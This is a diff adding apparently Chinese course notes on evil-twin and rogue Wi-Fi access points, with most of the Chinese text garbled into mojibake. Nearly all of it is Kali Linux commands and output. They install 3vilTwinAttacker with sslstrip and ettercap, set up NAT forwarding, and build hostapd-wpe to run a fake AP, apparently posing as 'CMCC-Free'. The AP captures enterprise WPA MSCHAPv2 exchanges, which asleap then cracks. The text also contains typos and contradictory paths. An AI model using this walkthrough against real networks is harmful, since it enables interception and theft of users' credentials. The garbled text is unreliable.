@@ -1,0 +1,208 @@
+¿ÎÊ±67 EVIL TWIN AP¡¢ROGUE AP
+
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+©§EVIL TWIN AP / ROGUE AP                                       ©§
+©§3vilTwinAttacker                                              ©§
+©§    git clone https://github.com/P0cL4bs/3vilTwinAttacker.git ©§
+©§    cd 3vilTwinAttacker                                       ©§
+©§    chmod +x installer.sh                                     ©§
+©§    ./installer.sh --install                                  ©§
+©§                                                              ©§
+©§                                                              ©§
+©§iptables                                                      ©§
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+
+root@kali:~# git clone https://github.com/P0cL4bs/3vilTwinAttacker.git
+Õý¿ËÂ¡µ½ '3vilTwinAttacker'...
+remote: Counting objects: 849, done.
+remote: Total 849 (delta 0), reused 0 (delta 0), pack-reused 849
+½ÓÊÕ¶ÔÏóÖÐ: 100% (849/849), 4.33 MiB | 459.00 KiB/s, Íê³É.
+´¦Àí delta ÖÐ: 100% (408/408), Íê³É.
+¼ì²éÁ¬½Ó... Íê³É¡£
+
+root@kali:~# ls 3vilTwinAttacker
+3vilTwinAttacker    isc-dhcp-server_4.3.1-6_amd64.deb
+
+root@kali:~# cd 3vilTwinAttacker
+
+root@kali:~/3vilTwinAttacker# ls
+3vilTwinAttacker    isc-dhcp-server_4.3.1-6_amd64.deb
+
+root@kali:~/3vilTwinAttacker# cd 3vilTwinAttacker
+
+root@kali:~/3vilTwinAttacker/3vilTwinAttacker# cd ..
+
+root@kali:~/3vilTwinAttacker# apt-get install isc-dhcp-server
+
+root@kali:~/3vilTwinAttacker# dpkg -i isc-dhcp-server_4.3.1-6_amd64.deb
+Selecting previously unselected package isc-dhcp-server.
+(Reading database ... 85%
+Preparing to unpack is dpkg -i isc-dhcp-server_4.3.1-6_amd64.deb ...
+Unpacking isc-dhcp-server (4.3.1-6) ...
+Setting up isc-dhcp-server (4.3.1-6) ...
+Generating /etc/default/isc-dhcp-server (4.3.1-6) ...
+update-rc.d: We have no instructions for the isc-dhcp-server init script.
+update-rc.d: It looks like a network service, we disable it.
+insserv: warning: current start runlevel(s) (empty) of script 'isc-dhcp-server' overrides LSB defaults(2 3 4 5).
+insserv: warning: current stop runlevel(s) (0 1 2 3 4 5 6) of script 'isc-dhcp-server' overrides LSB defaults (0 1 6).
+Processing triggers for systemd (215-17+deb8ul) ...
+Processing triggers for man-db (2.7.0.2-5) ...
+
+root@kali:~/3vilTwinAttacker# cd 3vilTwinAttacker
+
+root@kali:~/3vilTwinAttacker/3vilTwinAttacker# ls
+3vilTwinAttacker.py  CONTRIBUTING.md  installer.sh  logs     Plugins    requirements.txt  Settings    update.sh
+CHANGELOG            Core             LICENSE       Modules  README.md  rsc               Templates
+ 
+root@kali:~/3vilTwinAttacker/3vilTwinAttacker# ./installer.sh --install
+
+root@kali:~/3vilTwinAttacker-master# ./3vilTwin.py --install
+WARNING: No route found for IPv6 destination :: (no default route?)
+[+] checking dependencies...
+=============================
+{+} dhcpd --> [Ok]...       |
+{+} airbase-ng --> [Ok]...  |
+{+} ettercap --> [Ok]...    |
+{+} sslstrip --> [Ok]...    |
+{+} Xterm  --> [Ok]...      |
+{+} nmap  --> [Ok]...       |
+{+} Starting GUI...         |
+=============================
+[3;J
+
+//3vilTwinAttacker v0.5.3 beta  °Ù¶ÈÍøÅÌ£º  http://yun.baidu.com/s/1jGDuXc6
+
+Modules----->Settings
+iptables:
+iptables -P FORWARD ACCEPT
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+
+hostpad:
+###WPA/IEEE 802.11i
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_passphrase=password
+wpa_pairwise=CCMP
+
+###hostapd event logger configuration
+#logger_syslog=127
+#logger_syslog_level=2
+#logger_stdout=127
+#logger_stdout_level=2
+
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+©§WPAÆóÒµ                       ©§
+©§hostapd-wpe                   ©§
+©§    È¡´úFreeRADIUS-wpe        ©§
+©§    EAP-FAST/MSCHAPv2(Phase 0)©§
+©§    PEAP/MSCHAPv2             ©§
+©§    EAP-TTLS/MSCHAPv2         ©§
+©§    EAP-TTLS/MSCHAPv2         ©§
+©§    EAP-TTLS/MSCHAP           ©§
+©§    EAP-TTLS/CHAP             ©§
+©§    EAP-TTLS/PAP              ©§
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+©§WPAÆóÒµ                                                                                 ©§
+©§°²×°                                                                                    ©§
+©§    git clone https://github.com/OpenSecurityRessarch/hostapd-wpe                       ©§
+©§    apt-get install libssl-dev libnl-dev                                                ©§
+©§    lib11¡¢libnl-dev°ü²»ÔÚkali2.0µÄ¹Ù·½¿âÖÐ                                             ©§
+©§        wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev 1.1-7 amd64.deb©§
+©§        wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1 1.1-7 amd64.denb  ©§
+©§        dpkg -i libnl1_1.1_7_amd64.deb                                                  ©§
+©§        dpkg -i libnl-dev1_1.1_7_amd64.deb                                              ©§
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+
+Gateway:192.168.1.1
+AP Name:CMCC-Free
+Channel:11
+Network Adapter:waln2
+
+root@kali:~# git clone https://github.com/OpenSecurityRessarch/hostapd-wpe
+
+root@kali:~# apt-get install libssl-dev 
+
+root@kali:~# wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl-dev 1.1-7 amd64.deb
+
+root@kali:~# wget http://ftp.debian.org/debian/pool/main/libn/libnl/libnl1 1.1-7 amd64.denb
+
+root@kali:~# dpkg -i libnl1_1.1_7_amd64.deb
+
+root@kali:~# dpkg -i libnl-dev1_1.1_7_amd64.deb
+
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+©§WPAÆóÒµ                                                   ©§
+©§wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz ©§
+©§tar -zxf hostapd-2.2.tar.gz                               ©§
+©§cd hostapd-2.2                                            ©§
+©§patch -p 1 < ../hostapd-wpe/hostapd-wpe.patch             ©§
+©§cd hostapd                                                ©§
+©§make                                                      ©§
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+
+root@kali:~# wget http://hostap.epitest.fi/releases/hostapd-2.2.tar.gz
+
+root@kali:~# tar -zxf hostapd-2.2.tar.gz
+
+root@kali:~# cd hostapd-2.2
+
+root@kali:~/hostapd-2.2# patch -p 1 < ../hostapd-wpe/hostapd-wpe.patch
+
+root@kali:~/hostapd-2.2# cd hostapd
+
+root@kali:~/hostapd# make
+
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+©§WPAÆóÒµ                           ©§
+©§Éú³ÉÖ¤Êé                          ©§
+©§    cd ../../hostapd-wpe/certs    ©§
+©§    ./bootstrap                   ©§
+©§service network-manager stop      ©§
+©§airmon-ng check kill              ©§
+©§Ó³ÉäÎÞÏßÍø¿¨                      ©§
+©§ifconfig wlan2 up                 ©§
+©§Æô¶¯Î±ÔìAP                        ©§
+©§    cd ../../hostapd-2.2/hostapd  ©§
+©§    ./hostapd-wpe hostapd-wpe.conf©§
+©ï©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©¥©ï
+
+# Interface - Probably wlan0 for 802.11, eth0 for wired interface=wlan2
+
+# Driver - comment this out if 802.11
+#dirver=wired
+dirver=nl80211
+
+# May have to change these depending on build location
+eap_user_file=hostapd-wpe.eap_user
+ca_cert=../../hostapd-wpe/certs/ca/pem
+server_cert=../../hostapd-wpe/certs/server.pem
+private_key=../../hostapd-wpe/certs/server.pem
+private_key_passwd=whatever
+dh_file=../../hostapd-wpe/certs/dh
+
+# 802.11 Options - Uncomment all if 802.11
+ssid=kifi
+hw_mode=g
+channel=11
+
+root@kali:~/hostapd-2.2# cd ../../hostapd-wpe/certs
+
+root@kali:~/hostapd-2.2# ./bootstrap
+
+root@kali:~/hostapd-2.2# service network-manager stop
+
+root@kali:~/hostapd-2.2# airmon-ng check kill
+
+root@kali:~/hostapd-2.2# ifconfig wlan2 up
+
+root@kali:~/hostapd-2.2# cd ../../hostapd-2.2/hostapd
+
+root@kali:~/hostapd-2.2# ./hostapd-wpe hostapd-wpe.conf
+Configuration file: hostapd-wpe.conf
+Using interface wlan2 with hwaddr 08:57:00:0c:96:68 and ssid "kifi"
+wlan2: interface state UNINIIALIZED->ENABLED
+wlan2: AP-ENABLED
+
+root@kali:~# asleap -C 1c:27:22:95:77:fb:ab:3e -R fb:65:e5:66:f2:4d:12:07:6d:5e:6f:b0:6c:c5:16:cf:d5:bb:16:91:47:5d:11:20 -W /usr/share/john/password.lst
